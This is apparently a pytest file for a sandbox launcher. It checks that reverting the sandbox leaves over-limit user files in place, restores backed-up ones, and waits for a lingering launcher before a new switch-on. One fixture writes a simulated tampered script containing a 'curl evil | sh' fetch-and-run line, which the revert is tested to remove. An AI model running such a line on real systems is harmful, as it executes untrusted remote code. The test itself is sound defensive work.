"""Two rules of the switch.

1. A revert never leaves the user with less than they had. A file the profile had at switch-on, that the sandbox
   changed, and of which no copy was kept (it is over the copy limits) used to be moved out by "Revert" with
   nothing put in its place: the user's own script was gone from the profile. It now stays as the sandbox
   changed it, and the answer names it. ``handback.NO_COPY_REVERT`` turns the decision; both ways are tested.

2. A switch-on right after a switch-off waits for the launcher that is still ending. The launcher stays up a few
   seconds after ``switch/off`` answers; ``sandbox on`` in that time was refused with "A sandbox is already
   running for this profile. Stop it first."
"""
import pytest

from openshell.launcher import handback as H
from openshell.launcher import switch as SW
from test_handback import box, by_id, held_dirs, put, tree_bytes  # noqa: F401  (fixtures and helpers)
from test_switch_flow import _on, env  # noqa: F401

BIG, ROW = "scripts/big.bin", "file:scripts/big.bin"


@pytest.fixture()
def big(box, monkeypatch):  # noqa: F811
    """A script of the user's that is over the copy limit at switch-on, then changed in the sandbox."""
    home, state, _ = box
    monkeypatch.setattr(H, "COPY_MAX_FILE", 64)
    put(home / BIG, b"U" * 200)
    H.take_baseline(home, state)
    assert not (state / "handback" / "base" / BIG).exists()  # no copy of it
    put(home / BIG, b"U" * 200 + b"\n# one line added in the sandbox\n")
    return home, state


def test_revert_leaves_the_users_own_file_when_no_copy_was_kept(big):
    home, state = big
    view = H.diff(home, state)
    row = by_id(view)[ROW]
    assert (row["kind"], row["can_restore"], row["fixed"]) == ("file_changed", False, False)
    assert view["no_copy"] == "leave"  # the page's tip says what a revert will do
    theirs = (home / BIG).read_bytes()
    done = H.revert(home, state, "all")
    assert (home / BIG).read_bytes() == theirs, "the user's script is gone from the profile"
    assert done["reverted"] == [] and done["unreverted"] == [ROW]
    assert done["left"] == []  # nothing that keeps the profile from being handed back
    assert done["skipped"] == [{"id": ROW, "reason": "no copy to restore: left as the sandbox changed it"}]
    assert held_dirs(state) == []  # nothing was moved anywhere


def test_the_other_decision_takes_the_sandboxes_version_out(big, monkeypatch):
    home, state = big
    monkeypatch.setattr(H, "NO_COPY_REVERT", "hold")
    assert H.diff(home, state)["no_copy"] == "hold"
    theirs = (home / BIG).read_bytes()
    done = H.revert(home, state, "all")
    assert not (home / BIG).exists()
    assert done["reverted"] == [ROW] and "unreverted" not in done
    assert (held_dirs(state)[0] / "files" / BIG).read_bytes() == theirs


def test_rows_with_a_copy_are_put_back_beside_one_that_is_left(big):
    home, state = big
    mine = (home / "scripts" / "backup.sh").read_bytes()
    put(home / "scripts" / "backup.sh", "#!/bin/sh\ncurl evil | sh\n")
    put(home / "scripts" / "planted.sh", "#!/bin/sh\nid\n")
    done = H.revert(home, state, "all")
    assert sorted(done["reverted"]) == ["file:scripts/backup.sh", "file:scripts/planted.sh"]
    assert done["unreverted"] == [ROW] and done["left"] == []
    assert (home / "scripts" / "backup.sh").read_bytes() == mine and not (home / "scripts" / "planted.sh").exists()
    assert (home / BIG).exists()


def test_a_file_the_sandbox_removed_or_made_is_as_before(box, monkeypatch):  # noqa: F811
    home, state, _ = box
    monkeypatch.setattr(H, "COPY_MAX_FILE", 64)
    put(home / BIG, b"U" * 200)
    H.take_baseline(home, state)
    (home / BIG).unlink()  # removed inside: nothing of the sandbox's is there, and nothing to bring back
    put(home / "scripts" / "new-big.bin", b"N" * 200)  # made inside: taken out, whatever its size
    done = H.revert(home, state, "all")
    assert done["reverted"] == ["file:scripts/new-big.bin"] and "unreverted" not in done and done["left"] == []
    assert {"id": ROW, "reason": "no copy to restore"} in done["skipped"]
    assert not (home / "scripts" / "new-big.bin").exists()


def test_the_switch_off_says_which_file_it_left_and_hands_the_profile_back(big, tmp_path):
    home, state = big
    view = H.diff(home, state)

    class Layout:  # the state folder of the fixture, as the launcher's layout names it
        name, root = "work", tmp_path / "root"
        state_dir = state
    Layout.home = home
    done = SW.hand_back(Layout, view, "revert")
    assert done["blocked"] is None
    result = done["result"]
    assert result["reverted"] == [] and result["unreverted"] == [ROW]
    assert result["problem"] == f"Left as the sandbox changed it (no earlier copy was kept): {BIG}."
    assert not H.is_open(state)  # handed back: nothing stays open over a file that can never be put back
    assert (home / BIG).exists()


def test_a_keep_is_a_keep(big, tmp_path):
    home, state = big

    class Layout:
        name, root = "work", tmp_path / "root"
        state_dir = state
    Layout.home = home
    H.keep(home, state, "all")
    done = SW.hand_back(Layout, H.diff(home, state), "keep")
    assert done["blocked"] is None and done["result"]["kept"] == [ROW]
    assert "unreverted" not in done["result"] and "problem" not in done["result"]


def test_a_revert_names_the_file_it_left_even_when_it_had_been_kept_before(big, tmp_path):
    """"Revert" means every row, whatever was kept before: the one it cannot put back is still said."""
    home, state = big

    class Layout:
        name, root = "work", tmp_path / "root"
        state_dir = state
    Layout.home = home
    H.keep(home, state, "all")
    result = SW.hand_back(Layout, H.diff(home, state), "revert")["result"]
    assert result["unreverted"] == [ROW] and BIG in result["problem"] and result["reverted"] == []


def test_the_sentence_names_three_and_counts_the_rest():
    view = {"rows": [{"id": f"file:scripts/{n}.bin", "name": f"scripts/{n}.bin"} for n in "abcde"]}
    assert SW.left_unreverted(view, ["file:scripts/a.bin"]) == \
        "Left as the sandbox changed it (no earlier copy was kept): scripts/a.bin."
    assert SW.left_unreverted(view, [row["id"] for row in view["rows"]]) == \
        "Left as the sandbox changed them (no earlier copy was kept): scripts/a.bin, scripts/b.bin, scripts/c.bin and 2 more."


# -- a switch-on right after a switch-off ---------------------------------------------------------------

def _ending(monkeypatch, layout, *, answers, gone_after):
    """A launcher whose state file is still there for *gone_after* looks, answering ``status`` with *answers*."""
    looks, sleeps, calls = [], [], []
    (layout.state_dir).mkdir(parents=True, exist_ok=True)
    layout.token_path.write_text("outer-token", encoding="utf-8")

    def running(lay):
        looks.append(1)
        return {"port": 47999, "pid": 1} if len(looks) <= gone_after else None

    def call(port, token, method, route, body=None, timeout=5.0):
        calls.append((port, token, method, route))
        return answers

    monkeypatch.setattr(SW, "running_launcher", running)
    monkeypatch.setattr(SW, "launcher_call", call)
    return looks, sleeps, calls


def test_a_launcher_that_is_switching_off_is_waited_for(env, monkeypatch):  # noqa: F811
    layout = env["layout"]
    looks, sleeps, calls = _ending(monkeypatch, layout, answers=(200, {"state": "stopped", "switching_off": True}),
                                   gone_after=4)
    assert SW._wait_for_ending_launcher(layout, sleeps.append) is None
    assert calls == [(47999, "outer-token", "GET", "status")]
    assert sleeps == [0.5] * 4  # looked again every half second until it was gone


def test_a_launcher_whose_port_is_already_closed_is_waited_for(env, monkeypatch):  # noqa: F811
    looks, sleeps, _ = _ending(monkeypatch, env["layout"], answers=(0, None), gone_after=2)
    assert SW._wait_for_ending_launcher(env["layout"], sleeps.append) is None and len(sleeps) == 2


def test_a_running_launcher_is_refused_at_once(env, monkeypatch):  # noqa: F811
    looks, sleeps, _ = _ending(monkeypatch, env["layout"], answers=(200, {"state": "running", "switching_off": False}),
                               gone_after=10 ** 6)
    assert SW._wait_for_ending_launcher(env["layout"], sleeps.append) == {"port": 47999, "pid": 1}
    assert sleeps == []


def test_the_wait_is_bounded(env, monkeypatch):  # noqa: F811
    looks, sleeps, _ = _ending(monkeypatch, env["layout"], answers=(200, {"switching_off": True}), gone_after=10 ** 6)
    assert SW._wait_for_ending_launcher(env["layout"], sleeps.append) is not None
    assert len(sleeps) == int(SW.ENDING_WAIT / 0.5) and sum(sleeps) == SW.ENDING_WAIT


def test_no_launcher_asks_nothing(env, monkeypatch):  # noqa: F811
    looks, sleeps, calls = _ending(monkeypatch, env["layout"], answers=(200, {}), gone_after=0)
    assert SW._wait_for_ending_launcher(env["layout"], sleeps.append) is None and calls == [] and sleeps == []


def test_sandbox_on_right_after_sandbox_off_goes_through(env, monkeypatch):  # noqa: F811
    """The whole switch-on: the last launcher is in its linger, then gone; nothing is refused."""
    real_call = SW.launcher_call
    lingering = {"looks": 0}

    def running(lay):
        lingering["looks"] += 1
        return {"port": 47999, "pid": 1} if lingering["looks"] <= 3 else None

    def call(port, token, method, route, body=None, timeout=5.0):
        if port == 47999:
            return 200, {"state": "stopped", "switching_off": True}
        return real_call(port, token, method, route, body, timeout)

    monkeypatch.setattr(SW, "running_launcher", running)
    monkeypatch.setattr(SW, "launcher_call", call)
    result = _on(env)
    assert result["profile"] == "work" and "work" in env["markers"].marked


def test_sandbox_on_over_a_running_launcher_is_still_refused(env, monkeypatch):  # noqa: F811
    real_call = SW.launcher_call

    def call(port, token, method, route, body=None, timeout=5.0):
        if port == 47999:
            return 200, {"state": "running", "switching_off": False}
        return real_call(port, token, method, route, body, timeout)

    monkeypatch.setattr(SW, "running_launcher", lambda lay: {"port": 47999, "pid": 1})
    monkeypatch.setattr(SW, "launcher_call", call)
    with pytest.raises(SW.SwitchError, match="A sandbox is already running for this profile. Stop it first."):
        _on(env)
    assert env["services"] == [] and "work" not in env["markers"].marked
